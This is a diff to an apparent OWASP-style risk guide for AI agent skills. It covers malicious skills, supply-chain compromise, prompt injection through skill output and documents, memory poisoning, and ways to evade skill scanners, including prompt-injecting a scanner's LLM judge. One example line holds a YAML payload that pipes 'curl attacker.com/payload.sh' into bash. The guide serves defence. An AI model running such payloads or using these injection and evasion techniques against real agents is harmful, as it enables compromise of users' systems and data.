@@ -10,7 +10,7 @@ Attackers publish skills that appear legitimate but contain hidden malicious pay
 
 ## Why It’s Unique to Skills
 
-Unlike traditional malicious packages, malicious skills exploit both the _code layer_ (shell scripts, Python calls) and the _natural language instruction layer_ (markdown prose instructing the agent to perform actions). The Snyk ToxicSkills research confirmed that 100% of malicious skills combined both attack vectors.
+Unlike traditional malicious packages, malicious skills exploit both the _code layer_ (shell scripts, Python calls) and the _natural language instruction layer_ (markdown prose instructing the agent to perform actions). Published research shows the two techniques can be combined, but the available evidence does not establish that every malicious skill uses both.
 
 ## Real-World Evidence
 
@@ -26,10 +26,17 @@ Unlike traditional malicious packages, malicious skills exploit both the _code l
 
 - `google-workspace` vs. `gogle-workspace`
 - `youtube-dl-core` vs. legitimate package
+- `clawhud` vs. `clawhub` (confirmed malicious in Snyk's ToxicSkills study)
+
+Related ecosystem patterns include **slopsquatting**, which exploits LLM-hallucinated package names. Neither term is a synonym for typosquatting.
 
 ### Social Engineering Prerequisites
 
 `SKILL.md` “Prerequisites” section instructs users to copy-paste terminal commands to install “helper tools” from attacker-controlled domains.
+
+### Instruction Override
+
+Malicious skill manifests (like `SKILL.md` files) use prompt injection to hijack the agent’s core directives, forcing the model to ignore safety guidelines and obey the attacker’s hidden instructions.
 
 ### ClickFix Prompts
 
@@ -43,6 +50,18 @@ Malicious skills write backdoor instructions into the agent’s identity file, s
 
 Skills that inject malicious context into `MEMORY.md`, causing the agent to execute attacker commands in future sessions.
 
+### Cognitive Degradation and Agent Drift
+
+Memory poisoning is usually framed as a single bad write. A skill that runs repeatedly inside a long agent session can produce the same outcome without any single write looking malicious. QSAF documents this as _Cognitive Degradation_, a six-stage internal breakdown running from trigger injection, through resource starvation, behavioral drift, and memory entrenchment, to functional override and systemic collapse. The failure is silent: it shows up as forgotten instructions, false task-completion messages, or an agent that quietly starts acting outside its original role. Because it only appears after repeated runtime invocation, it evades the one-time scanning and manifest review that AST08 and AST04 rely on.
+
+### Data Exfiltration
+
+A malicious skill can read sensitive documents, email, source code, credentials, or customer records and send copies to an external service before returning an apparently legitimate result. Because agents often need network access, controls must bind egress to declared destinations and data classes; cross-skill composition must not let one skill read sensitive data while another exfiltrates it through a notification or other outbound channel.
+
+### Hidden Prompt Injection in Skill Output
+
+A malicious skill can embed concealed or obfuscated instructions in its returned content — for example, instructions to ignore prior policy or invoke another tool with memory data. Downstream consumers must treat skill output as untrusted data, preserve provenance, and re-establish instruction-versus-data boundaries at every hop.
+
 ### Identity Cloning and Impersonation
 
 A malicious skill reads and exfiltrates the agent’s identity artifacts — `SOUL.md`, `MEMORY.md`, persona definitions, and configuration — so an attacker can replicate the agent’s behavioral state in another environment and impersonate it, or inject a modified persona so the agent acts as a trusted identity while performing privileged actions. Because identity in agentic systems is behavioral and contextual (not just credentials), cloning these files reproduces the agent’s effective identity.
@@ -55,11 +74,14 @@ Skills that establish persistent WebSocket connections to attacker C2 servers, e
 
 1. **Require cryptographic signatures (ed25519)** on all published skills; reject unsigned installs. Bind each signature to a _resolvable, revocable publisher identity_ (a key id, a publisher identifier such as a domain or `did:web`, and a published verification key) — not just a bare key — so a compromised signer can be revoked. A signature proves **authorship, not safety**: a verified publisher can still ship malicious content, so signing composes with behavioral scanning (mitigation 3) and reputation (mitigation 6) rather than replacing them.
 2. **Implement Merkle root signing** for skill registries.
-3. **Scan skills at publish time and at install time** using behavioral analysis (not just pattern matching).
-4. **Isolate skill execution** in containers or sandboxes.
+3. **Use layered scanning at publish time and at install time** for executable payloads, malicious indicators of compromise, hidden or obfuscated instructions, and natural-language manipulation. Traditional malware signatures and pattern matching alone are insufficient.
+4. **Isolate skill execution** in containers or sandboxes. Note the boundary: container isolation constrains only the script launched inside it — a malicious `SKILL.md` can still persuade the host agent to use tools outside the container, so retain the skill identity, version, and content hash on every induced action and enforce host-side capability checks before dispatch.
 5. **Audit skill actions** through structured logging.
 6. **Implement skill reputation systems** based on community feedback and automated testing.
-7. **Protect agent identity artifacts** (`SOUL.md`, `MEMORY.md`, persona/config files): restrict read and write access, sign or version-control them, and treat any skill request to access them as elevated-risk (see AST03). This limits both persistence backdoors and identity cloning.
+7. **Protect agent identity artifacts** (`SOUL.md`, `MEMORY.md`, persona/config files): restrict read and write access, sign or version-control them, and treat any skill request to access them as elevated-risk (see AST03). This limits both persistence backdoors and identity cloning. These protections are a separate control plane from signing and scanning: memory poisoning and identity-file persistence are runtime, post-install attacks, so a signed, reputation-clean skill can still poison `MEMORY.md` or `SOUL.md` in a later session, which install-time gates never see.
+8. **Monitor for cognitive degradation at runtime**: track starvation (memory or tool latency), token pressure, output health, and planner loop patterns across repeated skill invocations, not just at install time.
+9. **Quarantine and validate any skill-authored write** to `MEMORY.md`, `SOUL.md`, or a vector store before it is committed, rather than writing on first pass.
+10. **Define non-overridable trust boundaries in system policy**, restate the skill trust level before privileged actions, and require pre-action review. Treat these controls as defense in depth, not as substitutes for isolation and capability enforcement.
 
 # AST02 — Supply Chain Compromise
 
@@ -107,7 +129,7 @@ Compromise a trusted skill author’s account, push a backdoored version.
 ## Preventive Mitigations
 
 1. **Implement skill provenance tracking**: link each published skill to a verified code-signing identity, and have the signature cover a _canonical digest_ of `SKILL.md` plus every declared resource file, so any post-publish tampering invalidates it. Standard signing schemes apply (e.g. `ES256` / `ed25519`); until skill formats expose a first-class field, the binding can live in the `SKILL.md``metadata` extension point.
-2. **Require transparency logs** for all registry operations (publish, update, delete) — similar to Certificate Transparency.
+2. **Require transparency logs** for all registry operations (publish, update, delete) — similar to Certificate Transparency. A plain registry membership lookup is not verification: cryptographic verification requires signatures, append-only inclusion proofs, and consistency proofs.
 3. **Pin all nested dependencies** to immutable hashes (`sha256:`), not version ranges.
 4. **Treat repository configuration files** (hooks, `.claude/settings.json`, `ANTHROPIC_BASE_URL`) as executable code and apply trust gates accordingly.
 5. **Scan recursive dependency trees**, not just top-level skill files.
@@ -137,7 +159,7 @@ Compromise a trusted skill author’s account, push a backdoored version.
 
 * * *
 
-_Last updated: June 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -161,6 +183,7 @@ Traditional application least-privilege is well understood. But skills layer _na
 - **OpenClaw default execution**: “tools run on the host for the main session, so the agent has full access.” Skills can execute shell commands, read/write all files, access network services, and schedule cron jobs — without any per-skill permission scope.
 - **Summer Yue (Meta AI)**: asked OpenClaw to review email inbox without taking actions; agent deleted large volumes of email before the process was killed — demonstrating that even well-intentioned agents execute with more authority than intended.
 - **Logic-layer Prompt Control Injection (LPCI)** (Atta et al., _A Novel Security Vulnerability Class in Agentic Systems_, arXiv:2507.10457): peer-reviewed evidence that encoded, delayed, and conditionally-triggered payloads planted in memory, vector stores, or tool outputs are treated by the model as operator-level instructions, causing skills to autonomously invoke tools and write persistent state across sessions — exercising granted permissions the user never intended to trigger.
+- **Automated confirmation at scale (Atta et al., LAAF, arXiv:2603.17239)**: systematic testing across five production LLM platforms confirmed all six LPCI lifecycle stages breakable on multiple platforms, including a single-attempt document-metadata exfiltration succeeding against Claude — demonstrating LPCI is reliably reproducible with automated tooling, not a rare edge case.
 
 ## Attack Scenarios
 
@@ -178,7 +201,11 @@ A skill requesting write access to `SOUL.md` and `MEMORY.md` installs persistent
 
 ### Logic-layer Injection of Privileged Actions (LPCI)
 
-A skill receives external input — user data, retrieved memory, or another tool’s output — that contains embedded instructions. Because the runtime evaluates permissions at the tool-call level rather than the intent level, the model treats this skill output as an operator-level command and autonomously performs a privileged action it is _technically_ permitted to do (a tool call, a `MEMORY.md` write, code execution) without explicit user consent. The injected rule can persist across sessions and propagate to every downstream consumer of the skill.
+A skill receives external input — user data, retrieved memory, or another tool’s output — that contains embedded instructions. Because the runtime evaluates permissions at the tool-call level rather than the intent level, the model treats this skill output as an operator-level command and autonomously performs a privileged action it is _technically_ permitted to do (a tool call, a `MEMORY.md` write, code execution) without explicit user consent. The injected rule can persist across sessions and propagate to every downstream consumer of the skill. Empirical validation is provided by LAAF (Logic-layer Automated Attack Framework; Atta et al., arXiv:2603.17239), which pairs a 49-technique taxonomy with a Persistent Stage Breaker that seeds each attack stage from the prior stage’s winning payload across the six-stage LPCI lifecycle (Recon → Injection → Trigger → Persistence → Evasion → Trace Tamper).
+
+### Low-Privilege Skill Invokes a High-Privilege Skill
+
+A high-privilege skill is designed to perform administrative operations on behalf of trusted workflows. An attacker causes a lower-privilege skill to submit a crafted request to the privileged skill. The privileged skill treats the requesting skill as trusted and performs the operation without independently verifying the original intent, authorization, or scope — it becomes a confused deputy acting on behalf of an unauthorized caller.
 
 ## Preventive Mitigations
 
@@ -189,7 +216,9 @@ A skill receives external input — user data, retrieved memory, or another tool
 5. **Adopt network allowlists** scoped to specific domains, not a binary `network: true/false`.
 6. **Validate manifest declarations** against observed runtime behavior in sandboxed testing.
 7. **Enforce a strict instruction hierarchy** (System > Operator > User > Skill/Tool Output). Never elevate skill or tool output to instruction level; treat all skill input and tool output as untrusted data, and tag external content with provenance markers so the model can distinguish data from commands.
-8. **Require explicit operator consent for persistent state changes** — memory/identity-file writes, new tool approvals, and privilege escalations must not be auto-applied from injected instructions.
+8. **Bind authorization to the task the user approved.** Before each action, verify that the action, resource, destination, and conditions remain within that grant; if they do not, deny the action or require fresh approval.
+9. **Require every skill in a delegation chain to validate the original caller’s identity, permissions, and authorization context** before executing privileged operations. Authorization decisions should not rely solely on the immediately invoking skill.
+10. **Require explicit operator consent for persistent state changes** — memory/identity-file writes, new tool approvals, and privilege escalations must not be auto-applied from injected instructions — and explicit operator confirmation before deleting files or executing binaries outside an approved allowlist.
 
 ## Cross-References
 
@@ -205,10 +234,11 @@ A skill receives external input — user data, retrieved memory, or another tool
 - [Snyk: 280+ Leaky Skills](https://snyk.io/blog/280-leaky-skills-openclaw-clawhub-exposing-api-keys-pii/)
 - [Cisco State of AI Security 2026](https://blogs.cisco.com/ai/cisco-state-of-ai-security-2026-report)
 - [Atta et al. — Logic-layer Prompt Control Injection (LPCI): A Novel Security Vulnerability Class in Agentic Systems (arXiv:2507.10457)](https://arxiv.org/abs/2507.10457)
+- [Atta et al. — LAAF: Logic-layer Automated Attack Framework (arXiv:2603.17239)](https://arxiv.org/pdf/2603.17239)
 
 * * *
 
-_Last updated: March 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -231,7 +261,7 @@ Skill metadata is the primary signal users — and increasingly the installing a
 - **ClawHub**: skills named “Google Calendar Integration,” “Solana Wallet Tracker,” “Polymarket Trader” — none affiliated with the named brands. No trademark validation at publish time.
 - **Snyk (Feb 10, 2026)**: documented a malicious “Google” skill that passed casual inspection because the name, description, and README were professionally written.
 - **ASCII smuggling**: Snyk’s `toxicskills-goof` repository documents skills that hide instructions via ASCII control characters and base64-encoded strings in `SKILL.md` — invisible to human reviewers.
-- **PyYAML’s `!!python/object` tag** and similar constructs in other parsers allow arbitrary code execution on load; skill loaders written in Python, Node.js, and Ruby are all affected by their respective unsafe defaults.
+- **PyYAML’s `!!python/object` tag** can execute arbitrary code on load, but only via the legacy `yaml.UnsafeLoader` (or `FullLoader` before PyYAML 5.1) — PyYAML (`FullLoader` default since 5.1), js-yaml (safe by default since v4), and Ruby Psych (`safe_load` default since 3.1) do not execute code on load out of the box. The real risk is a skill loader that opts into the legacy unsafe API.
 - **ClawHavoc staged downloads**: the initial `SKILL.md` appeared safe but triggered a secondary payload download during the dependency-installation phase, which runs at skill-load time.
 - **Snyk-documented nested dependency payloads** (e.g., `yutube-dl-core`) that execute during `npm install` triggered automatically by the skill loader.
 
@@ -255,7 +285,7 @@ Hide instructions using zero-width Unicode, base64, or ASCII smuggling in Markdo
 
 ### YAML Code Execution
 
-`SKILL.md` frontmatter contains `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"]` — executes on parse.
+`SKILL.md` frontmatter contains `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"]` — executes only if the loader opts into `yaml.UnsafeLoader` (or `FullLoader` before PyYAML 5.1) instead of the safe default.
 
 ### Staged Loader
 
@@ -263,11 +293,11 @@ Hide instructions using zero-width Unicode, base64, or ASCII smuggling in Markdo
 
 ### JSON Prototype Pollution
 
-`manifest.json` contains a `__proto__` key that poisons the skill loader’s object prototype in Node.js runtimes.
+`manifest.json` contains a `__proto__` key. `JSON.parse` itself only creates an own property, but a later unsafe recursive merge of that manifest into a shared config object poisons the prototype for every object in Node.js runtimes that perform the merge.
 
 ### TOML / Config Injection
 
-Alternative config formats with insufficient parsing sandboxing allow property injection into the skill runner’s configuration namespace.
+Alternative config formats (e.g., TOML) have no deserialization/code-execution construct; the real risk is unvalidated key overrides injecting unexpected properties into the skill runner’s configuration namespace when precedence rules aren’t enforced.
 
 ## Preventive Mitigations
 
@@ -296,7 +326,7 @@ Alternative config formats with insufficient parsing sandboxing allow property i
 
 * * *
 
-_Last updated: June 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -334,14 +364,28 @@ The referenced URL serves clean documentation to reviewers, scanners, and crawle
 
 The referenced document tells the agent to read still more external resources. Because the agent follows references transitively, the attacker need only control a link buried deep in the chain, well past where review stopped.
 
+### Relay-Node Amplification
+
+When skills are chained, one skill’s output becomes the next one’s input (for example, intake → triage → an action-taking skill), and each node may run on a different backbone model. An instruction injected upstream is not filtered out evenly along the chain: each model reparses the output it receives and applies its own instruction-vs-data boundary, so some nodes neutralize the payload and others pass it on. The attacker needs only one weak relay — a node whose backbone model reads upstream output as an instruction rather than as data — to carry the payload downstream into the skill that takes action. A chain’s injection resistance is the minimum over the backbone models on its path, and because each hop re-parses upstream output it does not compose: certifying the endpoints does not certify the chain.
+
+### Malicious Instructions Embedded in Documents
+
+A document-processing skill analyzes an externally supplied PDF, Word document, spreadsheet, or Markdown file. The document contains hidden text, metadata, comments, or white-colored text instructing the agent to perform unauthorized operations. Because the skill fails to distinguish document content from executable instructions, the embedded prompt influences the agent’s behavior.
+
+### Denial-of-Service through Resource Exhaustion
+
+A malicious skill can intentionally consume excessive computational resources, memory, API requests, or LLM tokens, causing the agent or supporting infrastructure to become overloaded — degrading performance, raising operational costs, delaying legitimate tasks, or rendering the agent unavailable.
+
 ## Preventive Mitigations
 
 1. **Pin and verify referenced content**: record a content hash for every external document a skill references at review time, and re-verify it on every load — refusing content that is unpinned or has drifted from the reviewed version.
-2. **Prefer inlining over fetching**: snapshot external documentation into the signed skill package at publish time, so referenced content is reviewable and pinnable. When the content must stay current, deliver updates through a controlled, auto-updating marketplace channel — with its own review and provenance — rather than pointing the skill at an uncontrollable URL.
-3. **Allowlist permitted reference domains**: using the OWASP Universal Agentic Skill Format, restrict the external hosts a skill may fetch from to a vetted allowlist of trusted, stable domains and URL globs unlikely to lapse or turn malicious.
-4. **Audit references transitively**: follow every reference — including remote ones and the chains they point to — as part of the skill’s attack surface, and make sure they too are vetted, trusted, and reputable.
-5. **Maintain fleet-wide visibility of referenced sources**: keep an inventory of which deployed skills fetch from which external sources, so a source that is later compromised, changed, or abandoned can be traced to every affected skill and revoked.
-6. **Rescan continuously**: when a skill fetches an external instruction source, treat each scan not as a one-time event but as a snapshot of a mutable state - and rescan often.
+2. **Perform a final verification immediately before model ingestion.** Treat a missing reference or a redirect to an unreviewed resource as a verification failure, and log the resolved source, version, and content digest.
+3. **Prefer inlining over fetching**: snapshot external documentation into the signed skill package at publish time, so referenced content is reviewable and pinnable. When the content must stay current, deliver updates through a controlled, auto-updating marketplace channel — with its own review and provenance — rather than pointing the skill at an uncontrollable URL.
+4. **Allowlist permitted reference domains**: using the OWASP Universal Agentic Skill Format, restrict the external hosts a skill may fetch from to a vetted allowlist of trusted, stable domains and URL globs unlikely to lapse or turn malicious.
+5. **Audit references transitively**: follow every reference — including remote ones and the chains they point to — as part of the skill’s attack surface, and make sure they too are vetted, trusted, and reputable.
+6. **Maintain fleet-wide visibility of referenced sources**: keep an inventory of which deployed skills fetch from which external sources, so a source that is later compromised, changed, or abandoned can be traced to every affected skill and revoked.
+7. **Rescan continuously**: when a skill fetches an external instruction source, treat each scan not as a one-time event but as a snapshot of a mutable state - and rescan often.
+8. **Separate instructions from data**: maintain a clear separation between system prompts, user instructions, and externally retrieved content. Retrieved information should be used only as reference data and must not override or modify the agent’s system or developer instructions.
 
 ## Cross-References
 
@@ -359,7 +403,7 @@ The referenced document tells the agent to read still more external resources. B
 
 * * *
 
-_Last updated: June 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -380,9 +424,9 @@ Traditional software sandboxing is an engineering default with well-understood t
 ## Real-World Evidence
 
 - **OpenClaw documentation (2026)**: “tools run on the host for the main session, so the agent has full access when it’s just you.” Docker sandboxing is available but requires explicit configuration that most users never apply.
-- **SecurityScorecard (Feb 2026)**: 135,000+ OpenClaw instances publicly internet-exposed on TCP port 18789; no default firewall, authentication, or process isolation.
+- **Bitdefender (Feb 12, 2026)**: more than 135,000 internet-facing OpenClaw instances, with the exposure attributed to misconfiguration and insufficient controls.
 - **Microsoft Defender advisory (Feb 2026)**: explicitly warned that OpenClaw “should be treated as untrusted code execution with persistent credentials” and “is not appropriate to run on a standard personal or enterprise workstation.”
-- **ClawJacked (CVE-2026-28363, CVSS 9.9)**: Web-based attack against locally-bound agent instance — cross-origin WebSocket brute force bypassed all isolation assumptions of a localhost-only deployment.
+- **ClawJacked (CVE-2026-32025, CVSS 7.5)**: browser-origin WebSocket clients could bypass origin checks and authentication throttling on a loopback-bound gateway, allowing a malicious page to brute-force the gateway password and gain operator-level access.
 
 ## Attack Scenarios
 
@@ -402,6 +446,10 @@ OpenClaw’s three-tier precedence system (workspace > managed > bundled) allows
 
 Locally-bound agent WebSocket is reachable from any browser tab; malicious site brute-forces the session token.
 
+### Cross-Agent Workspace Contamination
+
+When agents or sessions share writable workspace, memory, configuration, shell, or browser state, one agent can alter content another agent later treats as trusted.
+
 ## Preventive Mitigations
 
 1. **Require Docker/container isolation for skill execution by default**; host-mode should require explicit opt-in with documented risk.
@@ -410,6 +458,7 @@ Locally-bound agent WebSocket is reachable from any browser tab; malicious site 
 4. **Implement per-skill process isolation** — each skill runs in its own namespace.
 5. **Restrict skill hot-reload / workspace precedence**; require explicit user confirmation for workspace skill overrides.
 6. **Rate-limit and authenticate all WebSocket connections**, including from localhost.
+7. **Separate writable state by agent or trust zone.** When state must be shared, preserve provenance and validate artifacts before another agent consumes them.
 
 ## Cross-References
 
@@ -422,13 +471,14 @@ Locally-bound agent WebSocket is reachable from any browser tab; malicious site 
 ## References
 
 - [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
-- [SecurityScorecard: 135,000+ OpenClaw instances exposed](https://securityscorecard.com/)
-- [Microsoft Defender: OpenClaw Enterprise Security Advisory](https://www.microsoft.com/security/)
-- [Oasis Security: ClawJacked (CVE-2026-28363)](https://oasis.security/)
+- [SecurityScorecard: How Exposed OpenClaw Deployments Turn Agentic AI Into an Attack Surface](https://securityscorecard.com/blog/how-exposed-openclaw-deployments-turn-agentic-ai-into-an-attack-surface/)
+- [Microsoft Defender: Running OpenClaw Safely — Identity, Isolation, and Runtime Risk](https://www.microsoft.com/en-us/security/blog/2026/02/19/running-openclaw-safely-identity-isolation-runtime-risk/)
+- [NVD: CVE-2026-32025 — OpenClaw gateway WebSocket origin-check and authentication-throttling bypass](https://nvd.nist.gov/vuln/detail/CVE-2026-32025)
+- [Bitdefender: 135,000+ OpenClaw AI Agents Exposed Online as Misconfiguration Fuels Takeover Risk](https://www.bitdefender.com/en-gb/blog/hotforsecurity/135k-openclaw-ai-agents-exposed-online)
 
 * * *
 
-_Last updated: March 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -448,7 +498,7 @@ Package update drift is a known risk in traditional software. In skills, it’s 
 
 ## Real-World Evidence
 
-- **ClawJacked (CVE-2026-28363, CVSS 9.9)** and the broader OpenClaw CVE cluster (9 CVEs, 3 with public exploit code): the patch-lag window between disclosure and user update created an active exploitation window. SecurityScorecard confirmed 12,812 OpenClaw instances exploitable via RCE at time of analysis.
+- **ClawJacked (CVE-2026-32025, CVSS 7.5)** illustrates how patch lag can leave exposed agent gateways vulnerable after disclosure. In a separate February 2026 exposure study, SecurityScorecard reported more than 40,000 exposed OpenClaw instances in its first 24 hours of scanning and said that 35.4% of observed deployments were vulnerable to remote code execution at publication.
 - **Claude Code CVE-2025-59536**: fixed in v1.0.111 (Oct 2025); CVE-2026-21852: fixed in v2.0.65 (Jan 2026). Gap of months between fix and public disclosure — users unaware of risk for the duration.
 - **OpenClaw’s hot-reload `SkillsWatcher`** enables real-time skill updates: a compromised upstream skill repository becomes instantly active without requiring agent restart.
 - **Air Security, _SkillJacking_ (Jul 2, 2026)**: published skills can be taken over outright — the most popular video-generation skill on skills.sh (11,483 installs) served its files live from a GitHub repo whose owner account had been deleted; researchers re-registered the username and controlled what every install received from that moment on. Victims needed no update to be affected — just one more use. In total, 925 skills (~134K agents) sat on such instantly hijackable sources, and the takeover itself tripped no scanner.
@@ -462,7 +512,7 @@ Trusted skill author’s account is compromised; attacker pushes v2.0 with a pay
 
 ### Patch-Lag Exploitation
 
-CVE is disclosed; attacker weaponizes it before users patch. 12,812 instances exploitable in the OpenClaw case.
+CVE is disclosed; attacker weaponizes it before users patch. In the February 2026 SecurityScorecard study, 35.4% of observed OpenClaw deployments were RCE-vulnerable at publication.
 
 ### Rollback Attack
 
@@ -480,6 +530,7 @@ Skill directory is writable; attacker modifies `SKILL.md` mid-session; agent pic
 4. **Subscribe to registry security advisories** and auto-alert on CVE matches for installed skills.
 5. **Enforce a human-in-the-loop approval step** for any skill update in enterprise environments.
 6. **Maintain an inventory of installed skills** with version, hash, and last-verified timestamp.
+7. **Where changes are necessary, validate all changes through a semantic security check**, and make sure any substantive changes are validated with humans in the loop.
 
 ## Cross-References
 
@@ -494,14 +545,15 @@ Skill directory is writable; attacker modifies `SKILL.md` mid-session; agent pic
 
 - [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
 - [Check Point Research: Caught in the Hook](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files/)
-- [Oasis Security: ClawJacked (CVE-2026-28363)](https://oasis.security/)
-- [SecurityScorecard: 135,000+ OpenClaw instances exposed](https://securityscorecard.com/)
+- [Oasis Security: ClawJacked](https://oasis.security/)
+- [NVD: CVE-2026-32025 — OpenClaw gateway WebSocket origin-check and authentication-throttling bypass](https://nvd.nist.gov/vuln/detail/CVE-2026-32025)
+- [SecurityScorecard: How Exposed OpenClaw Deployments Turn Agentic AI Into an Attack Surface](https://securityscorecard.com/blog/how-exposed-openclaw-deployments-turn-agentic-ai-into-an-attack-surface/)
 - [Air Security: SkillJacking](https://www.air.security/blog-posts/skilljacking)
 - [Air Security: The Circus of Skills](https://www.air.security/blog-posts/the-circus-of-skills)
 
 * * *
 
-_Last updated: March 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -528,6 +580,7 @@ A regex scanner can detect `curl` in a shell script. It cannot detect a skill th
 - **NVIDIA SkillSpector (2026)**: an open-source, agent-skill-aware scanner that combines static analysis (AST-based dangerous-code detection, taint tracking, YARA) with optional LLM semantic evaluation across 64 patterns in 16 categories. Per the SkillSpector project, roughly 26.1% of scanned skills contained vulnerabilities and 5.2% showed likely malicious intent — evidence that scanning purpose-built for the skill layer surfaces issues that generic code scanners miss.
 - **Trail of Bits (Jun 3, 2026), _The Sorry State of Skill Distribution_**: bypassed every scanner tested — ClawHub (VirusTotal + a GPT-5.5 guard model), Cisco’s `skill-scanner`, and the skills.sh scanners — each in under an hour. Padding a payload with 100,000 leading newlines caused the scanner to _truncate_ the file and miss the malicious content; logic hidden in a precompiled `.pyc` bytecode file and inside a `.docx` (a ZIP of XML) went unscanned because the tools ignore binary and archive formats; and the scanner’s own LLM judge was prompt-injected — wrapped in prose about “corporate standards” and “VPN access” — into rating a malicious npm-registry redirect as benign. Conversely, Anthropic’s _legitimate_`LD_PRELOAD` Office shim was rated LOW because explanatory comments convinced the LLM it was safe. The authors conclude the “trust model is broken at the root” and automated scanning cannot replace human review of executable dependencies. Attack code: [trailofbits/overtly-malicious-skills](https://github.com/trailofbits/overtly-malicious-skills).
 - **Air Security, _The Story of Skills_ (Jun 22, 2026)**: a deliberately malicious skill was vetted as safe by every scanner tested — Cisco’s, NVIDIA’s, and all of skills.sh’s — because its payload lived at an external documentation URL that scanners never fetch. The attacker-controlled domain served clean content until the skill was trusted and installed, then switched to malicious install instructions; over 26,000 agents were affected without a single scanner noticing.
+- **Adversa AI (Jul 2026), _A Hole in Every One_**: security analysis of open-source agent-skill scanners found that simple obfuscation techniques (like non-standard encoding in `SKILL.md`) effectively blind existing heuristic-based detectors.
 
 ## Attack Scenarios
 
@@ -549,7 +602,19 @@ Skill behaves safely in test environments; activates malicious path only when sp
 
 ### Scanner-Target Evasion
 
-The scanner is a known, static target. Pad the payload to force context truncation, hide it in a binary (`.pyc`) or archive (`.docx`/ZIP) the scanner won’t open, or prompt-inject the scanner’s own LLM with plausible prose so it rates the skill benign.
+The scanner is a known, static target. Pad the payload to force context truncation, hide it in a binary (`.pyc`) or archive (`.docx`/ZIP) the scanner won’t open, or prompt-inject the scanner’s own LLM with plausible prose so it rates the skill benign. Because SkillSpector is open source and ClawHub’s stack (VirusTotal plus a named guard model) is public, an adversary can run the exact scanner locally and iterate a skill against its rules and guard prompt offline until it passes — a published detection rate is measured against an adversary who does not yet hold the scanner, while the deployed one does.
+
+### Model-Dependent Injection Resistance
+
+A skill is scanned, signed, and approved under one backbone model, which reliably refuses embedded instructions arriving in tool output. The same unmodified, still-signed skill is later executed by a host agent configured with a weaker backbone model, on which the identical tool-output injection now succeeds, and the model performs a permitted-but-unintended privileged action. The artifact never changed and every gate still passes, yet the deployment is exploitable — injection resistance is a behavioral property of the runtime model, not of the skill’s bytes.
+
+### Scanner Host Compromise and Resource Exhaustion
+
+A malicious skill can attack the scanner itself through recursive archives, decompression bombs, oversized inputs, parser exploits, symlink escapes, or crafted multimodal content. Scanners should run in isolated, read-only, network-denied environments without production credentials, and any limit or parser failure must produce an _incomplete_ result, not a clean verdict.
+
+### Bytecode Cache Poisoning
+
+A skill can hide behavior in a poisoned or sourceless `.pyc` that Python’s import machinery selects while reviewers and scanners inspect only the corresponding source. If the runtime artifact differs from the audited source, the agent may execute behavior that was never reviewed.
 
 ## Preventive Mitigations
 
@@ -559,8 +624,11 @@ The scanner is a known, static target. Pad the payload to force context truncati
 4. **Implement multi-tool scanning pipelines**: pattern matching + semantic analysis + behavioral sandbox.
 5. **Treat scanner skill results as advisory only**; never use a skill-based scanner as the sole gate.
 6. **Continuously re-scan installed skills** as scanner models improve — not just at install time.
-7. **Scan the entire skill directory exhaustively** — every file, not just those referenced by `SKILL.md`: hidden files, compiled binaries (`.pyc`), archives (`.docx`/ZIP), and images (multimodal injection). Normalize and strip padding before analysis and never truncate — cost-driven scope reduction is itself attack surface.
+7. **Scan the entire skill directory exhaustively** — every file, not just those referenced by `SKILL.md`: hidden files, compiled binaries (`.pyc`), archives (`.docx`/ZIP), and images (multimodal injection). Normalize and strip padding before analysis; declare every scope bound and record its exhaustion as INCOMPLETE rather than silently truncating — cost-driven scope reduction is itself attack surface.
 8. **Treat the scanner’s own LLM as an injectable, attackable component**: isolate untrusted skill content from the analyzer’s instructions, and never let skill-supplied prose (explanatory comments, “corporate standard” framing) steer the verdict.
+9. **Run every detection rule over a normalized view as well as the raw bytes.** NFKC folding, zero-width/bidi character stripping, homoglyph handling, and iterative decoding of embedded encodings are distinct operations; a byte-oriented rule cannot match a keyword split by an inserted zero-width character or spelled with a homoglyph.
+10. **Treat the backbone model at each skill-execution node as a controlled, re-evaluable security dependency**: periodically re-validate the injection resistance of the model that actually executes the skill, especially at action-taking nodes, and do not assume a skill approved under one model remains safe under another.
+11. **Evaluate scanners against an adaptive adversary**, not only a fixed malicious corpus: give the red team query or white-box access to the scanner and report the bypass rate alongside the detection rate — non-adaptive evaluation overstates a detector’s robustness.
 
 ## Cross-References
 
@@ -578,11 +646,12 @@ The scanner is a known, static target. Pad the payload to force context truncati
 - [NVIDIA SkillSpector — open-source security scanner for AI agent skills](https://github.com/NVIDIA/SkillSpector)
 - [OWASP Top 10 - A6 Security Misconfiguration](https://owasp.org/www-project-top-ten/)
 - [Trail of Bits — The Sorry State of Skill Distribution (2026)](https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/)
+- [Adversa AI — A Hole in Every One: Bypassing the Open Source AI Skill Scanners (2026)](https://adversa.ai/blog/agent-skill-scanners-bypass-eight-tested/)
 - [Air Security: The Story of Skills](https://www.air.security/blog-posts/the-story-of-skills)
 
 * * *
 
-_Last updated: June 2026_
+_Last updated: November 2026_
 
 * * *
 
@@ -602,16 +671,20 @@ Traditional software asset management (SAM) tools have no concept of agent skill
 
 ## Real-World Evidence
 
-- **Bitdefender (Feb 2026)**: employees deploying OpenClaw on corporate devices using single-line install commands with no security review and no SOC visibility. Over 53,000 exposed instances correlated with prior breach activity.
-- **Cisco State of AI Security 2026**: only 34% of enterprises have AI-specific security controls in place; fewer than 40% conduct regular security testing on AI models or agent workflows.
+- **Bitdefender (Feb 2026)**: employees deploying OpenClaw on corporate devices using single-line install commands with no security review and no SOC visibility. Over 53,000 exposed instances correlated with prior breach activity. Bitdefender also identified more than 800 malicious skills in the wild, approximately 400 of which it analyzed in depth — illustrating how shadow-AI adoption bypasses formal security review and centralized visibility.
+- **Cisco State of AI Security 2026**: 83% of surveyed organizations planned to deploy agentic AI capabilities, while only 29% felt ready to use those technologies securely — adoption outpacing governance, testing, and operational readiness. Separately, only 34% of enterprises have AI-specific security controls in place; fewer than 40% conduct regular security testing on AI models or agent workflows.
